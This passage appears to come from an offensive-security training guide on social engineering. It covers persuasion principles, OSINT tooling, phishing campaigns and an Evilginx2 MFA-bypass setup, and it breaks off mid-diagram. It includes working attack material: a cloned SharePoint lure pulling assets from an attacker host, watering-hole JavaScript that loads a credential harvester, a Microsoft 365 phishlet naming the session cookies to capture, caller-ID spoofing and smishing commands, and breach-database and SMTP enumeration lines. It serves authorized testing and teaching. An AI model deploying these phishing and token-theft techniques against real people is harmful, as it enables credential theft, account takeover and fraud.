# Social Engineering, Physical Security Testing, and Human-Factor Exploitation

## Table of Contents

1. [Social Engineering Fundamentals](#1-social-engineering-fundamentals)
2. [OSINT for Social Engineering](#2-osint-for-social-engineering)
3. [Phishing Campaigns](#3-phishing-campaigns)
4. [Advanced Phishing Techniques](#4-advanced-phishing-techniques)
5. [Pretexting and Impersonation](#5-pretexting-and-impersonation)
6. [Physical Security Testing](#6-physical-security-testing)
7. [Physical Access Techniques](#7-physical-access-techniques)
8. [Red Team Social Engineering Operations](#8-red-team-social-engineering-operations)
9. [Defense Against Social Engineering](#9-defense-against-social-engineering)
10. [Lab: Complete SE Engagement](#10-lab-complete-se-engagement)

---

## 1. Social Engineering Fundamentals

Social engineering exploits the most persistent vulnerability in any system: the human operator. Technical controls enforce deterministic rules; humans operate on heuristics, emotional states, trust relationships, and cognitive shortcuts. The social engineer's craft is the systematic exploitation of these predictable patterns to achieve unauthorized access, information disclosure, or action execution.

### 1.1 Psychology of Influence — Cialdini's Six Principles Applied to Security

Robert Cialdini's *Influence: The Psychology of Persuasion* (1984, revised 2021) identified six universal principles of persuasion. Every social engineering attack weaponizes at least one. Understanding them is prerequisite to both offense and defense.

#### 1.1.1 Reciprocity

Humans feel compelled to return favors. When someone gives us something — information, help, a gift — we experience psychological pressure to reciprocate.

**Offensive application:**

- An attacker sends a "helpful" IT advisory email warning about a fake breach, then follows up requesting credential verification "to protect the account."
- A physical penetration tester holds the door for employees multiple times over several days, building social credit before asking someone to badge them into a restricted area.
- A visher calls the helpdesk, provides "useful" information about a supposed system issue, then asks the analyst to look up account details "to verify the fix."

**Defensive implication:** Train employees to recognize unsolicited help as a potential influence vector. Establish that security procedures override social obligations.

#### 1.1.2 Commitment and Consistency

Once a person commits to a position or action, they feel internal pressure to behave consistently with that commitment. Small yeses lead to large yeses.

**Offensive application:**

- The foot-in-the-door technique: first ask a target to confirm their name and department (trivial), then their manager's name, then their VPN configuration, escalating each request incrementally.
- Phishing campaigns that start with a benign survey link, then follow up with "based on your responses, please update your credentials."
- In pretexting, getting someone to agree they "support the IT team" creates commitment pressure to then comply with IT-related requests.

**Defensive implication:** Teach the concept of escalating commitment. Any request chain where each step seems reasonable but the aggregate is dangerous should trigger suspicion.

#### 1.1.3 Social Proof

People look to others' behavior to determine correct action, especially under uncertainty. If "everyone else" is doing something, it must be right.

**Offensive application:**

- Phishing emails that reference colleagues: "John and Sarah from your team have already completed the security update."
- Watering hole attacks exploiting community trust: compromising a site that "everyone in the department visits."
- Physical pretexting: walking confidently through a lobby wearing the same lanyard color as employees signals belonging.
- Fake LinkedIn endorsements and mutual connections to build credibility for spear-phishing.

**Defensive implication:** Verification procedures must be independent of claimed social proof. "Other people did it" is not authorization.

#### 1.1.4 Authority

People comply with requests from perceived authority figures. Uniforms, titles, institutional language, and confident demeanor all project authority.

**Offensive application:**

- CEO fraud / Business Email Compromise (BEC): impersonating an executive to request wire transfers.
- Vishing as "the IT Director" demanding immediate password resets.
- Physical penetration testers wearing suits and carrying clipboards are rarely challenged.
- Emails from spoofed regulatory bodies ("PCI QSA audit team") demanding access to cardholder data environments.

**Defensive implication:** Implement out-of-band verification for any request invoking authority, especially those demanding urgency. A real executive will wait 90 seconds for a callback verification.

#### 1.1.5 Liking

We comply more readily with people we like. Attractiveness, similarity, compliments, and cooperative framing all increase compliance.

**Offensive application:**

- Building rapport during pretexting calls: finding common ground, mirroring language, complimenting the target's helpfulness.
- LinkedIn-based phishing from profiles with shared alma mater, industry, or interests.
- Physical pretexting: dressing similarly to employees, using their jargon, expressing frustration with the same organizational pain points.

**Defensive implication:** Awareness training should highlight that rapport is a technique, not proof of legitimacy. Procedures exist precisely to override personal impressions.

#### 1.1.6 Scarcity

Limited availability increases perceived value and urgency. Time pressure overrides deliberate analysis.

**Offensive application:**

- "Your account will be locked in 2 hours if you don't verify your credentials."
- "This firmware update window closes at 5 PM — we need your admin password now to push it."
- Physical: "The server room door seal is failing and I need access in the next 10 minutes before the temperature alarm triggers."

**Defensive implication:** Any request that manufactures urgency should increase scrutiny, not bypass it. Legitimate emergencies still follow procedures.

### 1.2 Cognitive Biases Exploited in Social Engineering

Beyond Cialdini's principles, social engineers exploit specific cognitive biases:

| Bias | Description | SE Exploitation |
|------|-------------|-----------------|
| Confirmation bias | Seeking information that confirms existing beliefs | Attacker frames request to match target's expectations ("IT said they'd call about this") |
| Anchoring | Over-relying on first piece of information | Leading with a legitimate-sounding context anchors the entire interaction as trustworthy |
| Urgency/time pressure | Reduced cognitive processing under deadline | Manufactured deadlines prevent verification ("server is down NOW") |
| Fear | Threat-induced compliance | "Your account has been compromised" — fear overrides rational analysis |
| Authority bias | Deferring to perceived authority regardless of verification | Impersonating executives, auditors, law enforcement |
| Dunning-Kruger | Overestimating one's ability to detect deception | "I'd never fall for phishing" — overconfident employees skip training |
| Normalcy bias | Underestimating probability of unusual events | "No one would try to social engineer us" |
| Bandwagon effect | Doing what others appear to be doing | "Everyone in your department has already reset their password" |
| Halo effect | Positive impression in one area creates assumed competence in others | Well-dressed, articulate attacker assumed to be legitimate |

### 1.3 The Social Engineering Kill Chain

Social engineering attacks follow a structured lifecycle analogous to the cyber kill chain:

```
┌───────────────┐    ┌────────────────────┐    ┌───────────────────┐
│ 1. Target     │───▶│ 2. Information     │───▶│ 3. Relationship   │
│    Selection  │    │    Gathering       │    │    Development    │
└───────────────┘    └────────────────────┘    └───────────────────┘
                                                        │
                                                        ▼
┌───────────────┐    ┌────────────────────┐    ┌───────────────────┐
│ 5. Execution  │◀───│ 4. Exploitation    │◀───│ 3b. Pretext       │
│               │    │                    │    │     Establishment  │
└───────────────┘    └────────────────────┘    └───────────────────┘
```

**Phase 1 — Target Selection:** Identify individuals with access, authority, or information relevant to the objective. Targets are selected based on role (helpdesk staff, sysadmins, executives, receptionists), access level, and susceptibility indicators (social media oversharing, new employee status, isolated role with limited peer verification).

**Phase 2 — Information Gathering:** OSINT collection on the target and their organization. Covered extensively in Section 2. This phase builds the knowledge base required for credible pretexting.

**Phase 3 — Relationship Development / Pretext Establishment:** Build trust, credibility, and rapport. This may occur over seconds (a single phishing email) or weeks (multi-stage pretexting with phone calls, emails, and in-person interactions). The pretext must be internally consistent and resilient to casual verification.

**Phase 4 — Exploitation:** Deploy the attack vector — phishing link, vishing call, physical entry attempt, USB drop. The exploitation leverages the trust established in Phase 3 to elicit the target action (click, disclose, open door, plug in device).

**Phase 5 — Execution:** Achieve the objective — credential capture, system access, physical entry, data exfiltration, malware execution. Document evidence. In an ethical engagement, this is where you collect your trophy and stop.

### 1.4 Ethics and Legal Framework for Social Engineering Testing

Social engineering testing operates in a legally sensitive space. Unauthorized social engineering is a criminal offense under computer fraud statutes in virtually every jurisdiction.

**Legal prerequisites — non-negotiable:**

1. **Written authorization** from an officer with legal authority to authorize testing (usually C-level or General Counsel). A verbal "go ahead" from a mid-level manager is insufficient.
2. **Scope definition** specifying exactly which techniques are authorized (phishing email: yes/no, phone calls: yes/no, physical entry: yes/no, specific buildings, specific employee groups, excluded individuals).
3. **Rules of Engagement (RoE)** covering escalation procedures, emergency contacts, "get out of jail free" letter for physical testers, data handling requirements, PII restrictions.
4. **Safety procedures** — protocols for when a target becomes distressed, when law enforcement is called, when a tester is physically confronted.
5. **Data handling agreement** — what happens to captured credentials, how long they're retained, who has access, destruction timeline.

**Relevant legal frameworks:**

| Jurisdiction | Key Statute | Relevance |
|---|---|---|
| United States | CFAA (18 U.S.C. § 1030) | Unauthorized access to computer systems; phishing for credentials could trigger |
| United States | Wire Fraud (18 U.S.C. § 1343) | Fraudulent pretexting over communications |
| European Union | GDPR Art. 5-6 | Processing employee personal data during SE testing requires lawful basis |
| United Kingdom | Computer Misuse Act 1990 | Unauthorized access, including credential harvesting |
| United Kingdom | Fraud Act 2006 | Fraud by false representation — covers pretexting |
| Germany | StGB § 202a-c | Data espionage, phishing, interception |
| Canada | Criminal Code §§ 342.1, 430 | Unauthorized use of computer, mischief to data |

**Ethical boundaries:**

- Never target individuals' personal accounts, devices, or relationships
- Never use discovered personal information (medical, financial, relationship) as leverage
- Never continue an engagement against a target who is visibly distressed
- Never retain or view actual sensitive data beyond what is necessary to prove access
- Always debrief targets privately and supportively — the goal is organizational improvement, not individual shame
- PII collected during testing must be encrypted at rest and destroyed per the engagement agreement

---

## 2. OSINT for Social Engineering

Open-source intelligence is the foundation of effective social engineering. The quality of your pretext correlates directly with the quality of your OSINT. This section covers intelligence gathering techniques specific to social engineering targeting.

### 2.1 People OSINT

#### 2.1.1 LinkedIn Intelligence

LinkedIn is the single most valuable OSINT source for corporate social engineering. It provides organizational structure, role titles, reporting relationships, technology exposure, employment history, and social connections.

**Manual techniques:**

- **Profile analysis:** Job titles reveal access levels. "Senior Database Administrator" has different access than "Marketing Coordinator." Recent title changes indicate new employees who may be less familiar with procedures.
- **Activity analysis:** Posts, comments, and shares reveal interests, opinions, technical stack familiarity, and personality traits useful for pretext development.
- **Connection mapping:** Shared connections between target and attacker (or attacker's sock puppet) enable warm introductions.
- **Job change monitoring:** New employees are prime targets — unfamiliar with verification procedures, eager to be helpful, unlikely to challenge requests from seeming colleagues.

**Automated collection:**

```bash
# linkedin2username — generate probable usernames from LinkedIn company pages
# Requires valid LinkedIn session cookies
python3 linkedin2username.py -c "TargetCompany" -n 5 -d 3 \
    -o target_employees.txt

# Typical output generates:
# firstname.lastname
# flastname
# firstl
# firstname_lastname
```

**Sock puppet operations:** Creating fake LinkedIn profiles for long-term intelligence gathering. Requires significant investment:

- Profile photo: AI-generated face (thispersondoesnotexist.com) or purchased stock — never real people
- Employment history: consistent, verifiable at surface level
- Activity: months of organic posting before engagement
- Connections: build 500+ connections in adjacent industries before connecting to targets
- Risk: LinkedIn actively detects and removes fake profiles; use dedicated infrastructure

#### 2.1.2 Social Media OSINT

**Facebook/Instagram:**

```bash
# Sherlock — find social media accounts by username
sherlock targetusername --timeout 10 --print-found

# Social-Analyzer — profile analysis across platforms
python3 social-analyzer --username "targetuser" --metadata --extract
```

Social media reveals: family relationships, pet names (password candidates), travel patterns (absence windows for physical testing), hobbies and interests (pretext material), location check-ins, employer complaints (disgruntlement indicators).

**Twitter/X:**

```bash
# Search for target mentions and interactions
# Using snscrape (Python library, more reliable than API for OSINT)
snscrape --jsonl twitter-search "from:target_handle" > tweets.json
snscrape --jsonl twitter-search "@target_handle" > mentions.json

# Analyze tweet metadata for patterns
cat tweets.json | jq -r '.date' | cut -dT -f2 | cut -d: -f1 | sort | uniq -c | sort -rn
# Reveals active hours — useful for timing phishing delivery
```

#### 2.1.3 Public Records and Breach Databases

**Breach data (authorized use only — check legal jurisdiction):**

```bash
# h8mail — email breach checking
h8mail -t target@company.com -bc /path/to/breach-compilation/

# Dehashed API query
curl "https://api.dehashed.com/search?query=email:target@company.com" \
    -H "Accept: application/json" \
    -u "your_email:your_api_key"
```

Breach data reveals: password patterns (if a user used `Company2019!` in a breach, they likely use `Company2024!` now), secondary email addresses, usernames across services, phone numbers.

**Public records:**

- Property records: home address, property value (social class targeting)
- Court records: legal proceedings, judgments
- Business registrations: side businesses, partnerships
- Professional licenses: verifiable credentials for impersonation

### 2.2 Organization OSINT

#### 2.2.1 Organizational Structure Intelligence

```bash
# theHarvester — email, subdomain, and name discovery
theHarvester -d targetcompany.com -b all -l 500 -f target_harvest.html

# Typical sources queried: baidu, bing, certspotter, crtsh, dnsdumpster,
# duckduckgo, hackertarget, hunter, rapiddns, sublist3r, threatcrowd, urlscan, virustotal
```

**Job postings as intelligence:**

Job descriptions are gold mines. They reveal:

| Job Posting Element | Intelligence Value |
|---|---|
| "Experience with Palo Alto firewalls" | Firewall vendor |
| "Familiar with ServiceNow ITSM" | Ticketing system for pretexting |
| "CrowdStrike Falcon administration" | EDR solution — affects payload selection |
| "Azure AD / Entra ID management" | Identity provider |
| "Splunk SIEM experience" | Detection capabilities |
| "On-call rotation using PagerDuty" | Incident response tooling |
| "SOC2 compliance experience" | Compliance framework — audit pretext |

```bash
# Scrape job postings for technology stack intel
# Google dork approach
# site:linkedin.com/jobs "targetcompany" "security" OR "sysadmin" OR "network"
# site:indeed.com "targetcompany" "firewall" OR "SIEM" OR "endpoint"

# Analyze cached job postings
curl -s "https://www.google.com/search?q=site:linkedin.com/jobs+%22targetcompany%22" \
    -H "User-Agent: Mozilla/5.0" | grep -oP 'href="[^"]*linkedin[^"]*"'
```

#### 2.2.2 Vendor and Partner Relationships

Third-party relationships enable impersonation pretexts. If you know the target company uses Cisco for networking, impersonating a Cisco support engineer is plausible.

Sources for vendor intelligence:

- News articles and press releases mentioning partnerships
- Case studies on vendor websites ("We helped TargetCo implement...")
- Technology trade show attendee lists and speaker schedules
- Government contract databases (for public sector targets)
- LinkedIn employee skills and endorsements aggregated across the organization

### 2.3 Email Pattern Discovery

Knowing the email format is essential for spear-phishing. Most organizations use one of a few patterns:

| Pattern | Example | Prevalence |
|---|---|---|
| firstname.lastname | john.smith@company.com | Most common |
| firstinitiallastname | jsmith@company.com | Common |
| firstname | john@company.com | Small companies |
| firstname_lastname | john_smith@company.com | Less common |
| lastnamefi | smithj@company.com | Government/academic |

**Discovery tools:**

```bash
# Hunter.io — email pattern and verification
curl "https://api.hunter.io/v2/domain-search?domain=targetcompany.com&api_key=YOUR_KEY" \
    | jq '.data.pattern, .data.emails[].value'

# Returns pattern (e.g., "{first}.{last}") and discovered emails

# Phonebook.cz — free email and domain enumeration
# Web interface at phonebook.cz — query domain for email patterns

# Verify discovered emails
curl "https://api.hunter.io/v2/email-verifier?email=john.smith@targetcompany.com&api_key=YOUR_KEY" \
    | jq '.data.status, .data.score'
```

**LinkedIn-derived email enumeration:**

```bash
# Given: employee names from LinkedIn + discovered email pattern
# Generate email list
while IFS=',' read -r first last; do
    echo "${first,,}.${last,,}@targetcompany.com"
done < linkedin_names.csv > target_emails.txt

# Validate with SMTP VRFY (where not blocked)
for email in $(cat target_emails.txt); do
    result=$(timeout 5 bash -c "echo -e 'VRFY $email\nQUIT' | nc -w 3 mail.targetcompany.com 25 2>/dev/null")
    echo "$email: $result"
done
```

### 2.4 Phone Number OSINT

Phone numbers enable vishing and smishing campaigns, and link to additional personal data:

```bash
# PhoneInfoga — phone number OSINT
phoneinfoga scan -n "+1234567890"
phoneinfoga serve  # Web UI for interactive analysis

# Outputs: carrier, line type (mobile/landline/VoIP), country,
# local/international format, links to search engines
```

**TrueCaller / Pipl / Whitepages:** These services reverse-lookup phone numbers to owner names and addresses. API access varies by jurisdiction and terms of service. Always verify legal authorization before querying personal phone data.

### 2.5 Physical Location OSINT

For physical penetration testing, remote reconnaissance of the facility is essential before on-site assessment.

**Google Earth / Google Maps / Street View:**

- Perimeter fencing type and height
- Gate locations, parking structure layout, loading docks
- Building entry points visible from the street
- Camera placement (dome, bullet, PTZ — visible on building exterior)
- Neighboring buildings with potential observation points
- Employee smoking areas (common tailgating entry points)
- Dumpster locations for dumpster diving
- Delivery schedules observable from repeated Street View imagery

**Building permits and floor plans:**

```bash
# Many municipalities publish building permits online
# Search: "targetcompany address" "building permit" site:gov
# Building permits may include floor plans, alarm system specifications,
# fire suppression layouts, and entry/exit diagrams

# FOIA requests (US) or equivalent FOI (UK/EU) for government-occupied buildings
# can yield security system specifications
```

**Satellite and drone imagery:** Historical satellite imagery (Google Earth timeline slider) reveals construction changes, security additions over time, and seasonal patterns (snow removal paths show which doors are actively used).

### 2.6 OSINT Frameworks

#### 2.6.1 Maltego

Maltego is a graphical OSINT and link analysis platform that automates entity relationship mapping.

```
# Maltego workflow for SE targeting:
# 1. Start with Company entity
# 2. Run transforms: Company → Email addresses
# 3. Run transforms: Company → People (LinkedIn, website)
# 4. Run transforms: Person → Phone numbers
# 5. Run transforms: Person → Social media profiles
# 6. Run transforms: Email → Breach data
# 7. Analyze graph for high-value targets (most connections, most access)

# Custom transform example (Maltego TRX):
# Input: Domain
# Output: Email pattern + employee emails
# Uses Hunter.io API under the hood
```

#### 2.6.2 SpiderFoot

```bash
# SpiderFoot — automated OSINT collection
# Install
pip install spiderfoot

# Run scan against target domain
sf -s targetcompany.com -t EMAILADDR,PHONE_NUMBER,SOCIAL_MEDIA \
    -m sfp_dnsresolve,sfp_hunter,sfp_linkedin,sfp_haveibeenpwned \
    -o json > spiderfoot_results.json

# Web UI
sf -l 127.0.0.1:5001
```

SpiderFoot modules relevant to SE:

| Module | Data Collected |
|---|---|
| sfp_hunter | Email addresses, patterns |
| sfp_linkedin | Employee profiles |
| sfp_haveibeenpwned | Breach exposure |
| sfp_social_media | Social profiles |
| sfp_phone | Phone numbers |
| sfp_names | Personnel names |
| sfp_company | Org structure |

#### 2.6.3 Recon-ng

```bash
# Recon-ng — modular OSINT framework
recon-ng

# Create workspace
[recon-ng] > workspaces create targetcompany

# Load modules for people OSINT
[recon-ng] > marketplace install recon/companies-contacts/bing_linkedin_cache
[recon-ng] > marketplace install recon/contacts-credentials/hibp_breach
[recon-ng] > marketplace install recon/contacts-profiles/fullcontact

# Set target domain
[recon-ng] > db insert companies
company (TEXT): Target Company
description (TEXT): SE target

# Run contact discovery
[recon-ng] > modules load recon/companies-contacts/bing_linkedin_cache
[recon-ng] > run

# Check contacts for breach exposure
[recon-ng] > modules load recon/contacts-credentials/hibp_breach
[recon-ng] > run

# Export results
[recon-ng] > modules load reporting/html
[recon-ng] > run
```

---

## 3. Phishing Campaigns

Phishing remains the most prevalent social engineering vector. This section covers operational phishing campaign execution for authorized testing.

### 3.1 Spear-Phishing

Spear-phishing targets specific individuals with customized content. Unlike bulk phishing, spear-phishing requires OSINT-informed pretext development.

#### 3.1.1 Target Profiling

For each target, compile:

- Full name, title, department, reporting chain
- Email address (verified)
- Recent professional activities (conference attendance, project mentions, publications)
- Communication style (formal/informal, jargon usage — observable from public posts)
- Current concerns or interests (recent company news, reorganization, technology migration)
- Relationship to the pretexted entity (do they interact with the vendor/department being impersonated?)

#### 3.1.2 Pretext Development

The pretext must be:

1. **Contextually appropriate** — matches the target's role, current activities, and organizational context
2. **Temporally relevant** — references current events, recent organizational changes, active projects
3. **Actionable** — provides a clear, plausible reason to click/download/reply
4. **Resistant to casual verification** — survives a 10-second "does this look right?" check

**Effective spear-phishing pretexts:**

- Shared document from a known colleague (Google Drive / SharePoint / Dropbox notification)
- Calendar invite for a meeting relevant to the target's projects
- Invoice from a known vendor (requires vendor OSINT)
- Security alert from the company's actual identity provider
- Conference registration confirmation (after confirming target's attendance via social media)
- Package delivery notification timed with known online ordering patterns

#### 3.1.3 Payload Crafting

```html
<!-- Example: SharePoint document notification clone -->
<!-- Harvest target's SharePoint branding from public-facing login pages -->
<html>
<body style="font-family: 'Segoe UI', sans-serif; background: #f3f2f1;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 20px;">
  <img src="https://phishing-infra.attacker.com/img/sharepoint-logo.png"
       alt="SharePoint" style="height: 24px;">
  <hr style="border: 1px solid #edebe9;">
  <p>Hi {{.FirstName}},</p>
  <p><strong>{{.From}}</strong> shared a document with you:</p>
  <div style="background: #f3f2f1; padding: 15px; border-radius: 4px;">
    <p style="margin: 0;">
      <strong>Q3 Budget Review — {{.Department}}</strong><br>
      <span style="color: #605e5c; font-size: 12px;">
        Modified {{.Date}} by {{.SenderName}}
      </span>
    </p>
  </div>
  <br>
  <a href="{{.URL}}" style="background: #0078d4; color: white;
     padding: 10px 20px; text-decoration: none; border-radius: 4px;">
     Open Document
  </a>
  <br><br>
  <p style="color: #605e5c; font-size: 11px;">
    This is an automated notification from SharePoint Online.
    You are receiving this because {{.Email}} has access to this site.
  </p>
</div>
</body>
</html>
```

### 3.2 Email Phishing Infrastructure

#### 3.2.1 GoPhish Setup

GoPhish is the standard open-source phishing framework for authorized testing.

```bash
# Installation
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
chmod +x /opt/gophish/gophish

# Generate TLS certificate for admin panel
openssl req -x509 -newkey rsa:4096 -keyout /opt/gophish/admin.key \
    -out /opt/gophish/admin.crt -days 365 -nodes \
    -subj "/CN=phishing-admin.internal"

# Configure config.json
cat > /opt/gophish/config.json << 'GOPHISH_CONFIG'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "admin.crt",
        "key_path": "admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:443",
        "use_tls": true,
        "cert_path": "/etc/letsencrypt/live/phish-domain.com/fullchain.pem",
        "key_path": "/etc/letsencrypt/live/phish-domain.com/privkey.pem"
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "",
    "logging": {
        "filename": "",
        "level": ""
    }
}
GOPHISH_CONFIG

# Start GoPhish
cd /opt/gophish && ./gophish &
# Default admin credentials printed to stdout on first run
```

**GoPhish campaign configuration workflow:**

```
1. Sending Profiles
   └── SMTP server configuration (relay, direct send, or third-party)
       ├── Host: smtp.sendgrid.net:587 (or self-hosted Postfix)
       ├── From: notifications@phish-domain.com
       └── Headers: X-Mailer removed, custom Message-ID

2. Landing Pages
   └── Credential capture page
       ├── Import from URL (clone target's login page)
       ├── Capture submitted data: ✓
       ├── Capture passwords: ✓ (store hashed, not plaintext)
       └── Redirect to real site after capture

3. Email Templates
   └── Spear-phishing email (HTML)
       ├── Template variables: {{.FirstName}}, {{.LastName}},
       │   {{.Position}}, {{.Email}}, {{.From}}, {{.URL}},
       │   {{.TrackingURL}}, {{.Tracker}}, {{.RId}}
       └── Embedded tracking pixel for open detection

4. Groups
   └── Target list (CSV import)
       ├── Columns: First Name, Last Name, Email, Position
       └── Source: OSINT phase output

5. Campaigns
   └── Combine: Sending Profile + Template + Landing Page + Group
       ├── Launch date/time (business hours, target timezone)
       ├── Send by date (stagger delivery to avoid bulk detection)
       └── URL: https://phish-domain.com/?rid={{.RId}}
```

#### 3.2.2 Domain Selection for Phishing

Domain selection is critical for bypassing both technical filters and human scrutiny:

```bash
# Techniques for domain selection:

# 1. Typosquatting
# targetcompany.com → targetcompanny.com, targetc0mpany.com, targetcompany.co

# 2. Homoglyph attacks (IDN homograph)
# targetcompany.com → tаrgetcompany.com (Cyrillic 'а' instead of Latin 'a')

# 3. TLD variations
# targetcompany.com → targetcompany.net, targetcompany.org, targetcompany.io

# 4. Subdomain abuse
# targetcompany.attacker-domain.com
# login.targetcompany.attacker.com

# 5. Keyword domains
# targetcompany-sso.com, targetcompany-portal.com, targetcompany-secure.com

# dnstwist — domain permutation engine
dnstwist --registered targetcompany.com
# Outputs hundreds of permutations with registration status,
# MX records, web server banners

# Check domain age and reputation before purchasing
whois candidate-domain.com | grep -i "creation date"
# Prefer domains aged >30 days — fresh domains trigger email security heuristics
```

#### 3.2.3 SPF, DKIM, and DMARC for the Attacker

Properly configuring email authentication on your phishing domain dramatically improves delivery rates:

```bash
# SPF record for phishing domain
# Authorize your sending IP
# DNS TXT record:
# phish-domain.com. IN TXT "v=spf1 ip4:YOUR.SENDING.IP.ADDR ~all"

# DKIM setup with OpenDKIM
apt install opendkim opendkim-tools
opendkim-genkey -D /etc/opendkim/keys/phish-domain.com/ \
    -d phish-domain.com -s mail

# Add DKIM public key as DNS TXT record:
# mail._domainkey.phish-domain.com. IN TXT "v=DKIM1; k=rsa; p=MIGfMA0G..."

# DMARC record (relaxed — you want delivery, not strict enforcement)
# _dmarc.phish-domain.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc@phish-domain.com"

# Verify configuration
dig +short TXT phish-domain.com        # SPF
dig +short TXT mail._domainkey.phish-domain.com  # DKIM
dig +short TXT _dmarc.phish-domain.com # DMARC

# Test email deliverability
# Send test to mail-tester.com and check score (aim for 9+/10)
```

### 3.3 Watering Hole Attacks

Watering hole attacks compromise websites frequently visited by the target group rather than targeting individuals directly.

**Methodology:**

1. Identify target group's frequently visited sites (industry forums, niche tools, internal wikis if externally accessible)
2. Assess the security posture of those sites
3. Compromise the site (XSS injection, supply chain compromise of embedded resources, ad network compromise)
4. Deploy selective payload — only trigger for visitors from the target organization's IP range
5. Deliver exploit or credential harvester

```javascript
// Selective payload deployment — only target specific organizations
// Injected into compromised watering hole site
(function() {
    // Check if visitor's IP matches target ranges
    // (Determined via WebRTC leak, third-party IP API, or server-side filtering)
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            const targetRanges = ['203.0.113.', '198.51.100.'];
            if (targetRanges.some(range => data.ip.startsWith(range))) {
                // Deploy credential harvester overlay
                loadCredentialCapture();
            }
        });
})();
```

### 3.4 SMS Phishing (Smishing)

```bash
# Smishing delivery via Twilio (authorized testing only)
# Twilio API for SMS
curl -X POST "https://api.twilio.com/2010-04-01/Accounts/$TWILIO_SID/Messages.json" \
    --data-urlencode "From=+1XXXXXXXXXX" \
    --data-urlencode "To=+1YYYYYYYYYY" \
    --data-urlencode "Body=TargetCorp IT: Your VPN certificate expires today. \
Renew immediately: https://vpn-targetcorp.phish-domain.com/renew" \
    -u "$TWILIO_SID:$TWILIO_AUTH_TOKEN"
```

**Effective smishing pretexts:**

- Package delivery notifications (USPS, FedEx, DHL)
- MFA/2FA verification codes with phishing link
- IT department VPN or certificate renewal
- HR benefits enrollment deadline
- Parking violation notice with payment link

### 3.5 Voice Phishing (Vishing)

Vishing exploits the inherent trust placed in phone conversations and the difficulty of verifying caller identity in real time.

**Caller ID spoofing:**

```bash
# SIPVicious — SIP-based calling for vishing
# Allows caller ID manipulation when using compliant VoIP providers

# Using Twilio for authorized caller ID spoofing
curl -X POST "https://api.twilio.com/2010-04-01/Accounts/$TWILIO_SID/Calls.json" \
    --data-urlencode "From=+1CORPORATE_NUMBER" \
    --data-urlencode "To=+1TARGET_NUMBER" \
    --data-urlencode "Url=https://handler.phish-domain.com/vish-twiml" \
    -u "$TWILIO_SID:$TWILIO_AUTH_TOKEN"

# TwiML for IVR-style vishing
# <Response>
#   <Say voice="alice">This is an automated security alert from Target Corp IT.
#   Your account has been flagged for suspicious activity.
#   Press 1 to verify your identity.</Say>
#   <Gather numDigits="1" action="/handle-response">
#     <Say>Press 1 to verify now, or press 2 to be transferred to security.</Say>
#   </Gather>
# </Response>
```

**Vishing pretexts:**

- IT helpdesk calling about a "detected breach" — needs user to "verify" credentials
- Vendor support calling about a service issue — needs remote access or admin credentials
- Executive assistant calling on behalf of the CEO — needs an urgent wire transfer
- Insurance / benefits provider needing to "confirm" SSN or employee ID
- Security team investigating a "compromised account" — needs the user to "test" a password reset link

**IVR (Interactive Voice Response) attacks:** Create a fake IVR system that mimics the target organization's phone tree, then direct targets to call it (via smishing or email) to "verify their account."

### 3.6 QR Code Phishing (Quishing)

QR codes bypass URL inspection because the destination is not visible before scanning.

```python
# Generate QR code for phishing URL
import qrcode

phishing_url = "https://login-targetcorp.phish-domain.com/sso"
qr = qrcode.QRCode(version=1, box_size=10, border=4)
qr.add_data(phishing_url)
qr.make(fit=True)
img = qr.make_image(fill_color="black", back_color="white")
img.save("phishing_qr.png")
```

**Quishing vectors:**

- Physical QR codes placed in the target's office (fake Wi-Fi setup instructions, printer configuration, benefits enrollment)
- QR codes embedded in phishing emails (bypasses URL scanners that don't decode QR images)
- QR codes on fake parking tickets placed on employee vehicles
- QR codes on flyers posted in common areas ("Scan to join the company social event")

### 3.7 Social Media Phishing

**LinkedIn InMail phishing:** Leverages LinkedIn's trusted messaging platform. InMail from a recruiter, industry peer, or vendor contact carries higher implicit trust than email.

**Attack flow:**

1. Create or compromise a LinkedIn profile with relevant industry credentials
2. Build connection network overlapping with targets
3. Send InMail with pretext: job opportunity, speaking invitation, collaboration request
4. Direct target to credential harvesting page disguised as a document, application form, or scheduling tool

---

## 4. Advanced Phishing Techniques

### 4.1 Adversary-in-the-Middle (AitM) — MFA Bypass

Standard phishing captures static credentials but fails against MFA-protected accounts. AitM phishing proxies the authentication session in real time, capturing both credentials and session tokens.

#### 4.1.1 Evilginx2

Evilginx2 is a man-in-the-middle framework that uses Nginx as a reverse proxy to intercept authentication flows, including MFA token exchange.

```bash
# Installation
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make

# Configuration
./evilginx2

# Set domain and IP
: config domain phish-domain.com
: config ipv4 YOUR.SERVER.IP

# Load phishlet (Microsoft 365 example)
: phishlets hostname microsoft365 login.phish-domain.com
: phishlets enable microsoft365

# Create lure
: lures create microsoft365
: lures edit 0 redirect_url https://office.com
: lures get-url 0
# Output: https://login.phish-domain.com/XXXXXX
```

**Microsoft 365 phishlet structure:**

```yaml
# Phishlet definition — microsoft365.yaml
name: 'Microsoft 365'
author: 'evilginx2'
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
    is_landing: true
  - phish_sub: 'www'
    orig_sub: 'www'
    domain: 'office.com'
    session: false

sub_filters:
  - triggers_on: 'login.microsoftonline.com'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: 'login.microsoftonline.com'
    replace: 'login.phish-domain.com'
    mimes: ['text/html', 'application/json', 'application/javascript']

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: '.microsoftonline.com'
    keys: ['SignInStateCookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/authorize'
```

**Session capture flow:**

```
Victim                    Evilginx2 Proxy              Microsoft 365
  │                            │                            │
  │ 1. Clicks phishing URL     │                            │
  │ ─────────────────────────▶ │                            │
  │                            │ 2. Proxies to real login   │
